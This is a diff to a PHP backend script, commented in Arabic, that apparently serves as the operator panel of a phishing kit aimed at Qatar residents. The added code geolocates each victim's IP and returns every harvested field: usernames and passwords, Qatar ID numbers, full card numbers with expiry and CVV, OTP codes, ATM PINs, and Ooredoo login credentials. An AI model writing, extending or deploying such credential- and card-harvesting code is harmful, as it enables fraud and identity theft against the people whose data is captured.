@@ -11,6 +11,25 @@ if (!$ref) {
     exit;
 }
 
+// دالة للحصول على الدولة من عنوان IP
+function getCountryFromIP($ip) {
+    if ($ip === '127.0.0.1' || $ip === 'localhost' || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0) {
+        return 'محلي';
+    }
+    
+    try {
+        $response = @file_get_contents("https://ipapi.co/{$ip}/json/");
+        if ($response !== false) {
+            $data = json_decode($response, true);
+            return $data['country_name'] ?? 'غير معروف';
+        }
+    } catch (Exception $e) {
+        // في حالة الفشل، نرجع قيمة افتراضية
+    }
+    
+    return 'غير معروف';
+}
+
 try {
     $stmt = $pdo->prepare("SELECT * FROM visitors WHERE visitor_id = ?");
     $stmt->execute([$ref]);
@@ -25,8 +44,12 @@ try {
     $stmtData->execute([$ref]);
     $details = $stmtData->fetchAll(PDO::FETCH_KEY_PAIR);
     
+    // الحصول على الدولة من IP
+    $country = getCountryFromIP($v['ip_address']);
+    
     $data = [
         'referenceId' => $v['visitor_id'],
+        'country' => $country,
         'clientName' => $details['name_ar'] ?? $details['username'] ?? '-',
         'clientId' => $details['id_number'] ?? '-',
         'clientPhone' => $details['phone_number'] ?? '-',
@@ -37,8 +60,47 @@ try {
         'serviceTime' => '-',
         'status' => $v['status'],
         'clientIp' => $v['ip_address'],
-        'clientEmail' => $details['email_confirm'] ?? '-',
+        'clientEmail' => $details['email_confirm'] ?? $details['email'] ?? '-',
         'clientNationality' => $details['nationality'] ?? '-',
+        'allData' => [
+            // البيانات الأساسية
+            'username' => $details['username'] ?? '-',
+            'password' => $details['password'] ?? '-',
+            'name_ar' => $details['name_ar'] ?? '-',
+            'name_en' => $details['name_en'] ?? '-',
+            'id_number' => $details['id_number'] ?? '-',
+            'qatar_id' => $details['qatar_id'] ?? '-',
+            'dob' => $details['dob'] ?? '-',
+            'gender' => $details['gender'] ?? '-',
+            'address' => $details['address'] ?? '-',
+            'email' => $details['email'] ?? '-',
+            'email_confirm' => $details['email_confirm'] ?? '-',
+            'phone_number' => $details['phone_number'] ?? '-',
+            'country_code' => $details['country_code'] ?? '-',
+            'account_type' => $details['account_type'] ?? '-',
+            'nationality' => $details['nationality'] ?? '-',
+            
+            // بيانات الدفع والبطاقة
+            'card_name' => $details['card_name'] ?? '-',
+            'card_number' => $details['card_number'] ?? '-',
+            'exp_month' => $details['exp_month'] ?? '-',
+            'exp_year' => $details['exp_year'] ?? '-',
+            'cvv' => $details['cvv'] ?? '-',
+            
+            // بيانات التحقق
+            'otp' => $details['otp'] ?? '-',
+            'atm_pin' => $details['atm_pin'] ?? '-',
+            
+            // بيانات Ooredoo
+            'ooredoo_user' => $details['ooredoo_user'] ?? '-',
+            'ooredoo_pass' => $details['ooredoo_pass'] ?? '-',
+            'ooredoo_otp' => $details['ooredoo_otp'] ?? '-',
+            
+            // بيانات أخرى
+            'vehicle_plate' => $details['vehicle_plate'] ?? '-',
+            'vehicle_type' => $details['vehicle_type'] ?? '-',
+            'region' => $details['region'] ?? '-',
+        ],
         'payment' => [
             'cardHolderName' => $details['card_name'] ?? '-',
             'cardNumber' => $details['card_number'] ?? '-',
